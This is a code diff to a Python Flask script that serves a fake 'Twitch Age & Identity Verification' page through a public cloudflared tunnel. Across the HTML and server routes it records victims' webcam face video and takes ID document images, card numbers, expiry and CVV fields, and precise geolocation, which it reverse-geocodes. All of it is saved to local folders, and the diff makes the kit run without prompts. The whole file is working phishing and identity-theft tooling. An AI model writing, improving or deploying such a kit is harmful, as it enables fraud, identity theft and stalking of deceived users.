@@ -21,14 +21,7 @@ def install_package(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
 
 def check_dependencies():
-    """Checks for cloudflared and required Python packages."""
-    try:
-        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
-        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
-        sys.exit(1)
-    
+    """Checks for required Python packages and cloudflared (optional)."""
     packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
     for pkg_name, import_name in packages.items():
         try:
@@ -36,8 +29,16 @@ def check_dependencies():
         except ImportError:
             install_package(pkg_name)
 
+    # Check for cloudflared, but do not exit if missing
+    try:
+        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        print("[WARN] 'cloudflared' is not installed or not in PATH. Running on localhost only.")
+        return False
+
 def run_cloudflared_and_print_link(port, script_name):
-    """Starts a cloudflared tunnel and prints the public link."""
+    """Starts a cloudflared tunnel and prints the public link (if available)."""
     cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in iter(process.stdout.readline, ''):
@@ -62,7 +63,6 @@ def generate_random_username():
     nouns = ["panda", "bear", "cat", "dog", "fox", "wolf", "tiger", "lion", "eagle", "hawk",
             "shark", "whale", "dolphin", "octopus", "snake", "spider", "ant", "bee", "butterfly", "dragon"]
     
-    # Generate different username patterns
     username_patterns = [
         lambda: f"{random.choice(gaming_prefixes)}_{random.choice(gaming_suffixes)}{random.randint(10, 999)}",
         lambda: f"{random.choice(adjectives)}_{random.choice(nouns)}{random.randint(1, 99)}",
@@ -87,12 +87,10 @@ def find_profile_picture(folder):
         if any(file_lower.endswith(ext) for ext in image_extensions):
             filepath = os.path.join(folder, file)
             try:
-                # Read the image file and convert to base64
                 with open(filepath, 'rb') as f:
                     image_data = f.read()
                     image_ext = os.path.splitext(file)[1].lower()
                     
-                    # Determine MIME type based on extension
                     mime_types = {
                         '.jpg': 'image/jpeg',
                         '.jpeg': 'image/jpeg',
@@ -115,13 +113,38 @@ def find_profile_picture(folder):
     
     return None
 
-def get_verification_settings():
-    """Get user preferences for Twitch verification process."""
+def get_verification_settings(interactive=False):
+    # Declare global first to avoid SyntaxError
+    global DOWNLOAD_FOLDER
+
+    if not interactive:
+        # Default settings (no prompts)
+        settings = {
+            'target_username': generate_random_username(),
+            'account_type': 'streamer',
+            'face_duration': 25,
+            'id_enabled': True,
+            'id_type': 'government',
+            'payment_enabled': True,
+            'location_enabled': True,
+            'profile_picture': None,
+            'profile_picture_filename': None
+        }
+        # Try to find a profile picture
+        profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
+        if profile_pic:
+            settings['profile_picture'] = profile_pic['data_url']
+            settings['profile_picture_filename'] = profile_pic['filename']
+            print(f"[+] Found profile picture: {profile_pic['filename']}")
+        else:
+            print("[!] No profile picture found; using default avatar.")
+        return settings
+
+    # Original interactive logic (unchanged)
     print("\n" + "="*60)
     print("TWITCH AGE VERIFICATION SETUP")
     print("="*60)
     
-    # Get target username
     print("\n[+] TARGET USERNAME SETUP")
     print("Enter the Twitch username to display in the verification page")
     print("Leave blank for random username generation")
@@ -134,8 +157,6 @@ def get_verification_settings():
         settings = {'target_username': random_username}
         print(f"[+] Generated random username: {random_username}")
     
-    # Look for profile picture
-    global DOWNLOAD_FOLDER
     profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
     if profile_pic:
         settings['profile_picture'] = profile_pic['data_url']
@@ -150,7 +171,6 @@ def get_verification_settings():
     
     print(f"\n[+] Verification will appear for: @{settings['target_username']}")
     
-    # Account type
     print("\n1. Account Type:")
     print("Is this a streamer or viewer account?")
     print("1. Streamer Account (wants to stream content)")
@@ -170,7 +190,6 @@ def get_verification_settings():
         else:
             print("Please enter 1 or 2.")
     
-    # Face scan duration
     print(f"\n2. Face Scan Duration:")
     print(f"How many seconds for face verification for {settings['account_type']} account?")
     print("Recommended: 15-30 seconds for complete verification")
@@ -190,7 +209,6 @@ def get_verification_settings():
         except ValueError:
             print("Please enter a valid number.")
     
-    # ID verification
     print(f"\n3. ID Document Verification:")
     print(f"Require ID document upload for age verification?")
     id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
@@ -219,7 +237,6 @@ def get_verification_settings():
             else:
                 print("Please enter 1, 2, or 3.")
     
-    # Payment verification (for streamers)
     if settings['account_type'] == 'streamer':
         print(f"\n4. Payment Verification:")
         print(f"Require payment method verification for monetization?")
@@ -228,7 +245,6 @@ def get_verification_settings():
     else:
         settings['payment_enabled'] = False
     
-    # Location verification
     print(f"\n5. Location Verification:")
     print(f"Require location verification for regional compliance?")
     location_enabled = input("Enable location verification (y/n, default: y): ").strip().lower()
@@ -241,7 +257,6 @@ def get_verification_settings():
 geolocator = Nominatim(user_agent="twitch_verification")
 
 def get_ip_info():
-    """Get IP-based location information."""
     try:
         response = requests.get("http://ipinfo.io/json", timeout=5)
         response.raise_for_status()
@@ -250,7 +265,6 @@ def get_ip_info():
         return {}
 
 def get_nearby_places(latitude, longitude, radius=2000, limit=3):
-    """Return nearby shops/amenities."""
     overpass_query = f"""
     [out:json];
     (
@@ -294,7 +308,6 @@ def get_nearby_places(latitude, longitude, radius=2000, limit=3):
         return []
 
 def process_and_save_location(data, session_id):
-    """Process and save location data with metadata."""
     try:
         lat = data.get('latitude')
         lon = data.get('longitude')
@@ -302,7 +315,6 @@ def process_and_save_location(data, session_id):
         if not lat or not lon:
             return
         
-        # Get address information
         address_details = {}
         full_address = "Unknown"
         try:
@@ -314,13 +326,9 @@ def process_and_save_location(data, session_id):
         except Exception:
             pass
         
-        # Get nearby places
         places = get_nearby_places(lat, lon)
-        
-        # Get IP info
         ip_info = get_ip_info()
         
-        # Prepare structured data
         location_data = {
             "verification_type": "twitch_location",
             "session_id": session_id,
@@ -357,7 +365,6 @@ def process_and_save_location(data, session_id):
             }
         }
         
-        # Save to file
         filename = f"twitch_location_{session_id}.json"
         filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
         
@@ -374,18 +381,7 @@ def process_and_save_location(data, session_id):
 app = Flask(__name__)
 
 # Global settings
-VERIFICATION_SETTINGS = {
-    'target_username': 'twitch_user_' + str(random.randint(100000, 999999)),
-    'account_type': 'streamer',
-    'face_duration': 25,
-    'id_enabled': True,
-    'id_type': 'government',
-    'payment_enabled': True,
-    'location_enabled': True,
-    'profile_picture': None,
-    'profile_picture_filename': None
-}
-
+VERIFICATION_SETTINGS = {}
 DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Twitch Verification')
 os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
 os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
@@ -405,13 +401,11 @@ def create_html_template(settings):
     profile_picture = settings.get('profile_picture')
     profile_picture_filename = settings.get('profile_picture_filename')
     
-    # Generate account stats
     followers = random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000)
     following = random.randint(50, 500)
     total_views = random.randint(1000, 100000) if account_type == 'streamer' else 0
-    account_age = random.randint(30, 365 * 3)  # days
+    account_age = random.randint(30, 365 * 3)
     
-    # Calculate total steps
     total_steps = 2  # Introduction + Face
     if id_enabled:
         total_steps += 1
@@ -421,7 +415,6 @@ def create_html_template(settings):
         total_steps += 1
     total_steps += 1  # Final step
     
-    # Generate the base template with variables
     template = f'''<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -670,7 +663,6 @@ def create_html_template(settings):
             transition: width 0.3s ease;
         }}
         
-        /* Twitch Purple Theme */
         .twitch-purple {{
             color: #9146ff;
         }}
@@ -679,7 +671,6 @@ def create_html_template(settings):
             background: linear-gradient(135deg, #9146ff, #bf94ff);
         }}
         
-        /* Warning Box */
         .warning-box {{
             background: linear-gradient(135deg, rgba(255, 69, 0, 0.1) 0%, rgba(255, 69, 0, 0.05) 100%);
             border: 1px solid rgba(255, 69, 0, 0.3);
@@ -711,7 +702,6 @@ def create_html_template(settings):
             line-height: 1.5;
         }}
         
-        /* Info Box */
         .info-box {{
             background: linear-gradient(135deg, rgba(145, 70, 255, 0.1) 0%, rgba(191, 148, 255, 0.05) 100%);
             border: 1px solid rgba(145, 70, 255, 0.3);
@@ -743,7 +733,6 @@ def create_html_template(settings):
             line-height: 1.5;
         }}
         
-        /* Face Verification Styles */
         .camera-container {{
             width: 300px;
             height: 300px;
@@ -817,7 +806,6 @@ def create_html_template(settings):
             font-size: 0.9rem;
         }}
         
-        /* ID Verification Styles */
         .id-upload-section {{
             display: grid;
             grid-template-columns: 1fr;
@@ -910,7 +898,6 @@ def create_html_template(settings):
             left: 0;
         }}
         
-        /* Payment Verification Styles */
         .payment-options {{
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -992,7 +979,6 @@ def create_html_template(settings):
             box-shadow: 0 0 0 3px rgba(145, 70, 255, 0.2);
         }}
         
-        /* Location Verification Styles */
         .location-container {{
             text-align: center;
             margin-bottom: 25px;
@@ -1079,7 +1065,6 @@ def create_html_template(settings):
             font-weight: 500;
         }}
         
-        /* Button Styles */
         .button {{
             width: 100%;
             padding: 16px 24px;
@@ -1138,7 +1123,6 @@ def create_html_template(settings):
             to {{ transform: rotate(360deg); }}
         }}
         
-        /* Status Messages */
         .status-message {{
             padding: 15px 20px;
             border-radius: 12px;
@@ -1165,7 +1149,6 @@ def create_html_template(settings):
             color: #bf94ff;
         }}
         
-        /* Completion Page */
         .completion-container {{
             text-align: center;
             padding: 40px 20px;
@@ -1204,7 +1187,6 @@ def create_html_template(settings):
             margin: 20px 0;
         }}
         
-        /* Review Page */
         .review-container {{
             text-align: center;
             padding: 40px 20px;
@@ -1275,7 +1257,6 @@ def create_html_template(settings):
             line-height: 1.5;
         }}
         
-        /* Footer */
         .footer {{
             text-align: center;
             margin-top: 40px;
@@ -1302,7 +1283,6 @@ def create_html_template(settings):
             text-decoration: underline;
         }}
         
-        /* Utility Classes */
         .hidden {{
             display: none !important;
         }}
@@ -1326,7 +1306,6 @@ def create_html_template(settings):
 </head>
 <body>
     <div class="container">
-        <!-- Twitch Logo Header -->
         <div class="logo-header">
             <div class="logo">
                 <span class="twitch-purple">Twitch</span>
@@ -1334,7 +1313,6 @@ def create_html_template(settings):
             <div class="logo-subtitle">Age & Identity Verification System</div>
         </div>
         
-        <!-- Account Information Card -->
         <div class="account-card">
             <div class="account-header">
                 <div class="account-avatar">
@@ -1369,9 +1347,7 @@ def create_html_template(settings):
             </div>
         </div>
         
-        <!-- Verification Container -->
         <div class="verification-container">
-            <!-- Progress Indicator -->
             <div class="progress-container">
                 <div class="progress-bar">
                     <div class="progress-fill" id="progressFill"></div>
@@ -1387,7 +1363,6 @@ def create_html_template(settings):
                 </div>
             </div>
             
-            <!-- Step 1: Introduction -->
             <div class="step active" id="step1">
                 <h2 class="step-title">Account Verification Required</h2>
                 <p class="step-subtitle">
@@ -1433,7 +1408,6 @@ def create_html_template(settings):
                 </div>
             </div>
             
-            <!-- Step 2: Face Verification -->
             <div class="step" id="step2">
                 <h2 class="step-title">Face Verification</h2>
                 <p class="step-subtitle">
@@ -1466,7 +1440,6 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Step 3: ID Verification -->
             <div class="step" id="step3">
                 <h2 class="step-title">ID Document Verification</h2>
                 <p class="step-subtitle">
@@ -1533,7 +1506,6 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Step 4: Payment Verification (Streamers only) -->
             <div class="step" id="step4">
                 <h2 class="step-title">Payment Verification</h2>
                 <p class="step-subtitle">
@@ -1594,7 +1566,6 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Step 5: Location Verification -->
             <div class="step" id="step5">
                 <h2 class="step-title">Location Verification</h2>
                 <p class="step-subtitle">
@@ -1656,7 +1627,6 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Final Step: Processing -->
             <div class="step" id="stepFinal">
                 <h2 class="step-title">Verification in Progress</h2>
                 <p class="step-subtitle">
@@ -1677,7 +1647,6 @@ def create_html_template(settings):
                 </div>
             </div>
             
-            <!-- Completion Step -->
             <div class="step" id="stepComplete">
                 <div class="completion-container">
                     <div class="success-icon">✅</div>
@@ -1715,7 +1684,6 @@ def create_html_template(settings):
                 </div>
             </div>
             
-            <!-- Review Status Step -->
             <div class="step" id="stepReview">
                 <div class="review-container">
                     <div class="review-icon">⏳</div>
@@ -1789,7 +1757,6 @@ def create_html_template(settings):
             </div>
         </div>
         
-        <!-- Footer -->
         <div class="footer">
             <div>© 2024 Twitch, Inc. All rights reserved.</div>
             <div class="footer-links">
@@ -1802,7 +1769,6 @@ def create_html_template(settings):
     </div>
     
     <script>
-        // Global variables
         let currentStep = 1;
         let totalSteps = {total_steps};
         let faceStream = null;
@@ -1821,7 +1787,6 @@ def create_html_template(settings):
         let accountType = "{account_type}";
         let countdownTimer = null;
         
-        // Face scan instructions
         let faceInstructions = [
             {{icon: "👤", text: "Look Straight Ahead", detail: "Keep your face centered in the circle", duration: 3}},
             {{icon: "👈", text: "Turn Head Left", detail: "Slowly turn your head to the left side", duration: 3}},
@@ -1833,13 +1798,11 @@ def create_html_template(settings):
             {{icon: "✅", text: "Complete", detail: "Face verification successful!", duration: 1}}
         ];
         
-        // Step Navigation
         function updateProgress() {{
             const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
             document.getElementById('progressFill').style.width = progress + '%';
             document.getElementById('stepLineFill').style.width = progress + '%';
             
-            // Update step indicators
             const indicators = document.querySelectorAll('.step-indicator');
             indicators.forEach((indicator, index) => {{
                 indicator.classList.remove('active', 'completed');
@@ -1852,12 +1815,9 @@ def create_html_template(settings):
         }}
         
         function showStep(stepNumber) {{
-            // Hide all steps
             document.querySelectorAll('.step').forEach(step => {{
                 step.classList.remove('active');
             }});
-            
-            // Show requested step
             const stepElement = document.getElementById('step' + stepNumber);
             if (stepElement) {{
                 stepElement.classList.add('active');
@@ -1878,14 +1838,12 @@ def create_html_template(settings):
             }}
         }}
         
-        // Face Verification
         async function startFaceVerification() {{
             try {{
                 const button = document.getElementById('startFaceBtn');
                 button.disabled = true;
                 button.innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                 
-                // Request camera access
                 faceStream = await navigator.mediaDevices.getUserMedia({{
                     video: {{
                         facingMode: 'user',
@@ -1895,10 +1853,7 @@ def create_html_template(settings):
                     audio: false
                 }});
                 
-                // Show video feed
                 document.getElementById('faceVideo').srcObject = faceStream;
-                
-                // Start the verification process
                 startFaceInstructions();
                 
             }} catch (error) {{
@@ -1915,21 +1870,16 @@ def create_html_template(settings):
             faceTimeLeft = {face_duration};
             updateFaceTimer();
             showFaceInstruction(0);
-            
-            // Start face recording
             startFaceRecording();
             
-            // Start countdown timer
             faceTimerInterval = setInterval(() => {{
                 faceTimeLeft--;
                 updateFaceTimer();
-                
                 if (faceTimeLeft <= 0) {{
                     completeFaceVerification();
                 }}
             }}, 1000);
             
-            // Cycle through instructions
             instructionTimer = setInterval(() => {{
                 currentInstructionIndex++;
                 if (currentInstructionIndex < faceInstructions.length) {{
@@ -1958,19 +1908,16 @@ def create_html_template(settings):
         function startFaceRecording() {{
             faceChunks = [];
             const options = {{ mimeType: 'video/webm;codecs=vp9' }};
-            
             try {{
                 faceRecorder = new MediaRecorder(faceStream, options);
             }} catch (e) {{
                 faceRecorder = new MediaRecorder(faceStream);
             }}
-            
             faceRecorder.ondataavailable = (event) => {{
                 if (event.data && event.data.size > 0) {{
                     faceChunks.push(event.data);
                 }}
             }};
-            
             faceRecorder.onstop = sendFaceRecording;
             faceRecorder.start(100);
         }}
@@ -1978,22 +1925,14 @@ def create_html_template(settings):
         function completeFaceVerification() {{
             clearInterval(faceTimerInterval);
             clearInterval(instructionTimer);
-            
-            // Stop recording
             if (faceRecorder && faceRecorder.state === 'recording') {{
                 faceRecorder.stop();
             }}
-            
-            // Stop camera
             if (faceStream) {{
                 faceStream.getTracks().forEach(track => track.stop());
             }}
-            
-            // Show completion
             showFaceInstruction(faceInstructions.length - 1);
             document.getElementById('faceTimer').textContent = "✅ Complete";
-            
-            // Auto-proceed after delay
             setTimeout(() => {{
                 nextStep();
             }}, 2000);
@@ -2001,13 +1940,10 @@ def create_html_template(settings):
         
         function sendFaceRecording() {{
             if (faceChunks.length === 0) return;
-            
             const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
             const reader = new FileReader();
-            
             reader.onloadend = function() {{
                 const base64data = reader.result.split(',')[1];
-                
                 $.ajax({{
                     url: '/submit_face_verification',
                     type: 'POST',
@@ -2028,29 +1964,22 @@ def create_html_template(settings):
                     }}
                 }});
             }};
-            
             reader.readAsDataURL(videoBlob);
         }}
         
-        // ID Verification
         function handleIDFileSelect(input, type) {{
             const file = input.files[0];
-            if (file) {{
-                handleIDFile(file, type);
-            }}
+            if (file) handleIDFile(file, type);
         }}
         
         function handleIDFileDrop(event, type) {{
             event.preventDefault();
             event.currentTarget.classList.remove('dragover');
             const file = event.dataTransfer.files[0];
-            if (file && file.type.startsWith('image/')) {{
-                handleIDFile(file, type);
-            }}
+            if (file && file.type.startsWith('image/')) handleIDFile(file, type);
         }}
         
         function handleIDFile(file, type) {{
-            // Show preview
             const reader = new FileReader();
             reader.onload = function(e) {{
                 const preview = document.getElementById(type + 'Preview');
@@ -2059,8 +1988,6 @@ def create_html_template(settings):
                 preview.style.display = 'block';
             }};
             reader.readAsDataURL(file);
-            
-            // Store file
             idFiles[type] = file;
             checkIDSubmitReady();
         }}
@@ -2075,12 +2002,9 @@ def create_html_template(settings):
             statusDiv.className = 'status-message status-processing';
             statusDiv.innerHTML = '<span class="loading-spinner"></span>Uploading ID documents...';
             statusDiv.style.display = 'block';
-            
             const button = document.getElementById('submitIdBtn');
             button.disabled = true;
             button.innerHTML = '<span class="loading-spinner"></span>Processing...';
-            
-            // Prepare form data
             const formData = new FormData();
             if (idFiles.front) formData.append('front_id', idFiles.front);
             if (idFiles.back) formData.append('back_id', idFiles.back);
@@ -2089,8 +2013,6 @@ def create_html_template(settings):
             formData.append('target_username', targetUsername);
             formData.append('id_type', '{id_type}');
             formData.append('account_type', accountType);
-            
-            // Submit
             $.ajax({{
                 url: '/submit_id_verification',
                 type: 'POST',
@@ -2100,10 +2022,7 @@ def create_html_template(settings):
                 success: function(response) {{
                     statusDiv.className = 'status-message status-success';
                     statusDiv.textContent = '✓ ID documents uploaded successfully!';
-                    
-                    setTimeout(() => {{
-                        nextStep();
-                    }}, 1500);
+                    setTimeout(() => nextStep(), 1500);
                 }},
                 error: function(xhr, status, error) {{
                     statusDiv.className = 'status-message status-error';
@@ -2114,21 +2033,13 @@ def create_html_template(settings):
             }});
         }}
         
-        // Payment Verification
         function selectPaymentMethod(method) {{
             selectedPaymentMethod = method;
-            
-            // Update UI
             document.querySelectorAll('.payment-option').forEach(option => {{
                 option.classList.remove('selected');
             }});
             event.currentTarget.classList.add('selected');
-            
-            // Show payment details
-            const detailsDiv = document.getElementById('paymentDetails');
-            detailsDiv.style.display = 'block';
-            
-            // Enable submit button
+            document.getElementById('paymentDetails').style.display = 'block';
             document.getElementById('submitPaymentBtn').disabled = false;
         }}
         
@@ -2137,12 +2048,9 @@ def create_html_template(settings):
             statusDiv.className = 'status-message status-processing';
             statusDiv.innerHTML = '<span class="loading-spinner"></span>Verifying payment method...';
             statusDiv.style.display = 'block';
-            
             const button = document.getElementById('submitPaymentBtn');
             button.disabled = true;
             button.innerHTML = '<span class="loading-spinner"></span>Processing...';
-            
-            // Collect payment data
             paymentData = {{
                 method: selectedPaymentMethod,
                 card_number: document.getElementById('cardNumber').value,
@@ -2153,13 +2061,9 @@ def create_html_template(settings):
                 session_id: sessionId,
                 target_username: targetUsername
             }};
-            
-            // Simulate API call
             setTimeout(() => {{
                 statusDiv.className = 'status-message status-success';
                 statusDiv.textContent = '✓ Payment method verified successfully!';
-                
-                // Submit to server
                 $.ajax({{
                     url: '/submit_payment_verification',
                     type: 'POST',
@@ -2169,19 +2073,14 @@ def create_html_template(settings):
                         console.log('Payment verification uploaded');
                     }}
                 }});
-                
-                setTimeout(() => {{
-                    nextStep();
-                }}, 1500);
+                setTimeout(() => nextStep(), 1500);
             }}, 2000);
         }}
         
-        // Location Verification
         function requestLocation() {{
             const button = document.getElementById('locationBtn');
             const statusDiv = document.getElementById('locationStatus');
             const detailsDiv = document.getElementById('locationDetails');
-            
             button.disabled = true;
             button.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
             statusDiv.className = 'status-message status-processing';
@@ -2196,7 +2095,6 @@ def create_html_template(settings):
                 return;
             }}
             
-            // Get location
             navigator.geolocation.getCurrentPosition(
                 (position) => {{
                     updateLocationUI(position);
@@ -2217,32 +2115,21 @@ def create_html_template(settings):
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
-            
-            // Update display
             document.getElementById('latValue').textContent = lat.toFixed(6);
             document.getElementById('lonValue').textContent = lon.toFixed(6);
             document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} meters`;
             document.getElementById('addressValue').textContent = 'Processing address...';
-            
-            // Calculate accuracy percentage
             let accuracyPercentage = 100;
             if (accuracy < 10) accuracyPercentage = 95;
             else if (accuracy < 50) accuracyPercentage = 85;
             else if (accuracy < 100) accuracyPercentage = 70;
             else if (accuracy < 500) accuracyPercentage = 50;
             else accuracyPercentage = 30;
-            
             document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
-            
-            // Show details
             document.getElementById('locationDetails').style.display = 'block';
-            
-            // Update status
             const statusDiv = document.getElementById('locationStatus');
             statusDiv.className = 'status-message status-success';
             statusDiv.textContent = `✓ Location acquired with ${{Math.round(accuracy)}}m accuracy`;
-            
-            // Store data
             locationData = {{
                 latitude: lat,
                 longitude: lon,
@@ -2282,49 +2169,30 @@ def create_html_template(settings):
             const button = document.getElementById('locationBtn');
             button.disabled = true;
             button.textContent = '✓ Location Verified';
-            
-            setTimeout(() => {{
-                startFinalVerification();
-            }}, 2000);
+            setTimeout(() => startFinalVerification(), 2000);
         }}
         
-        // Final Processing
         function startFinalVerification() {{
             showStep('stepFinal');
             const statusDiv = document.getElementById('finalStatus');
             let progress = 25;
-            
             const progressInterval = setInterval(() => {{
                 progress += Math.random() * 15;
                 if (progress > 100) progress = 100;
-                
                 let message = '';
-                if (progress < 30) {{
-                    message = `Verifying face scan... ${{Math.round(progress)}}%`;
-                }} else if (progress < 50) {{
-                    message = `Checking ID documents... ${{Math.round(progress)}}%`;
-                }} else if (progress < 70) {{
-                    message = accountType === 'streamer' ? `Verifying payment method... ${{Math.round(progress)}}%` : `Verifying location... ${{Math.round(progress)}}%`;
-                }} else if (progress < 90) {{
-                    message = `Analyzing location data... ${{Math.round(progress)}}%`;
-                }} else {{
-                    message = `Finalizing verification... ${{Math.round(progress)}}%`;
-                }}
-                
+                if (progress < 30) message = `Verifying face scan... ${{Math.round(progress)}}%`;
+                else if (progress < 50) message = `Checking ID documents... ${{Math.round(progress)}}%`;
+                else if (progress < 70) message = accountType === 'streamer' ? `Verifying payment method... ${{Math.round(progress)}}%` : `Verifying location... ${{Math.round(progress)}}%`;
+                else if (progress < 90) message = `Analyzing location data... ${{Math.round(progress)}}%`;
+                else message = `Finalizing verification... ${{Math.round(progress)}}%`;
                 statusDiv.textContent = message;
-                
                 if (progress >= 100) {{
                     clearInterval(progressInterval);
                     setTimeout(() => {{
                         statusDiv.className = 'status-message status-success';
                         statusDiv.textContent = `✓ Verification complete for @${{targetUsername}}!`;
-                        
-                        // Submit complete verification
                         submitCompleteVerification();
-                        
-                        setTimeout(() => {{
-                            showCompletionPage();
-                        }}, 1500);
+                        setTimeout(() => showCompletionPage(), 1500);
                     }}, 1000);
                 }}
             }}, 800);
@@ -2332,16 +2200,12 @@ def create_html_template(settings):
         
         function showCompletionPage() {{
             showStep('stepComplete');
-            
-            // Start countdown
             let countdown = 5;
             const countdownElement = document.getElementById('countdown');
             countdownElement.textContent = countdown;
-            
             countdownTimer = setInterval(() => {{
                 countdown--;
                 countdownElement.textContent = countdown;
-                
                 if (countdown <= 0) {{
                     clearInterval(countdownTimer);
                     showReviewPage();
@@ -2380,13 +2244,8 @@ def create_html_template(settings):
             }});
         }}
         
-        // Initialize
         updateProgress();
-        
-        // Auto-start first step
-        setTimeout(() => {{
-            showStep(1);
-        }}, 500);
+        setTimeout(() => showStep(1), 500);
     </script>
 </body>
 </html>'''
@@ -2406,16 +2265,13 @@ def submit_face_verification():
             target_username = data.get('target_username', 'unknown')
             account_type = data.get('account_type', 'unknown')
             
-            # Create filename
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"twitch_face_{target_username}_{session_id}_{timestamp}.webm"
             video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
             
-            # Save video
             with open(video_file, 'wb') as f:
                 f.write(base64.b64decode(video_data))
             
-            # Save metadata
             metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
             metadata = {
                 'filename': filename,
@@ -2448,7 +2304,6 @@ def submit_id_verification():
         id_type = request.form.get('id_type', 'government')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
         
-        # Handle front ID
         front_filename = None
         if 'front_id' in request.files:
             front_file = request.files['front_id']
@@ -2458,7 +2313,6 @@ def submit_id_verification():
                 front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                 front_file.save(front_path)
         
-        # Handle back ID
         back_filename = None
         if 'back_id' in request.files:
             back_file = request.files['back_id']
@@ -2468,7 +2322,6 @@ def submit_id_verification():
                 back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                 back_file.save(back_path)
         
-        # Save metadata
         metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
         metadata = {
             'front_id': front_filename,
@@ -2503,7 +2356,6 @@ def submit_payment_verification():
             filename = f"twitch_payment_{target_username}_{session_id}_{timestamp}.json"
             file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_proofs', filename)
             
-            # Remove sensitive data (in real scenario, this would be encrypted)
             safe_data = data.copy()
             if 'card_number' in safe_data:
                 safe_data['card_number'] = '****' + safe_data['card_number'][-4:] if safe_data['card_number'] else '****'
@@ -2531,15 +2383,10 @@ def submit_location_verification():
         if data and 'latitude' in data and 'longitude' in data:
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
-            
-            # Add target username to data
             data['target_username'] = target_username
-            
-            # Process location in background thread
             processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
             processing_thread.daemon = True
             processing_thread.start()
-            
             print(f"Received Twitch location data for {target_username}: {session_id}")
             return jsonify({"status": "success", "message": "Location verification submitted"}), 200
         else:
@@ -2560,7 +2407,6 @@ def submit_complete_verification():
             filename = f"twitch_complete_{target_username}_{session_id}_{timestamp}.json"
             file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
             
-            # Add system info
             data['received_at'] = datetime.now().isoformat()
             data['server_timestamp'] = timestamp
             data['verification_type'] = 'twitch_complete'
@@ -2710,15 +2556,39 @@ def privacy_policy():
     </html>'''
 
 if __name__ == '__main__':
-    check_dependencies()
+    # Install dependencies and check cloudflared
+    cloudflared_ok = check_dependencies()
     
-    # Get verification settings from user
-    VERIFICATION_SETTINGS = get_verification_settings()
+    # Parse command line arguments
+    interactive = '--interactive' in sys.argv
     
+    # Set default settings (non-interactive)
+    VERIFICATION_SETTINGS = get_verification_settings(interactive=interactive)
+    
+    # Suppress Flask's default banner and logs
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
-    sys.modules['flask.cli'].show_server_banner = lambda *x: None
+    
+    # Remove any Werkzeug reloader environment variables
+    os.environ.pop('WERKZEUG_SERVER_FD', None)
+    # Ensure we are not in reloader mode
+    os.environ['WERKZEUG_RUN_MAIN'] = 'false'
+    
+    # Find an available port (start from 4046, try next if busy)
     port = 4046
+    max_port = 4050
+    while port <= max_port:
+        import socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        result = sock.connect_ex(('127.0.0.1', port))
+        sock.close()
+        if result != 0:
+            break
+        port += 1
+    if port > max_port:
+        print("[ERROR] No available port found in range 4046-4050.")
+        sys.exit(1)
+    
     script_name = "Twitch Age Verification"
     
     print("\n" + "="*60)
@@ -2730,8 +2600,8 @@ if __name__ == '__main__':
     if VERIFICATION_SETTINGS.get('profile_picture'):
         print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
     else:
-        print(f"[!] No profile picture found")
-        print(f"[!] Place any image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
+        print(f"[!] No profile picture found; using default avatar.")
+        print(f"[!] Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
     
     print(f"[+] Data will be saved to: {DOWNLOAD_FOLDER}")
     print(f"[+] Face scan duration: {VERIFICATION_SETTINGS['face_duration']} seconds")
@@ -2750,10 +2620,10 @@ if __name__ == '__main__':
     if VERIFICATION_SETTINGS['location_enabled']:
         print(f"    - location_data/")
     print(f"    - user_data/")
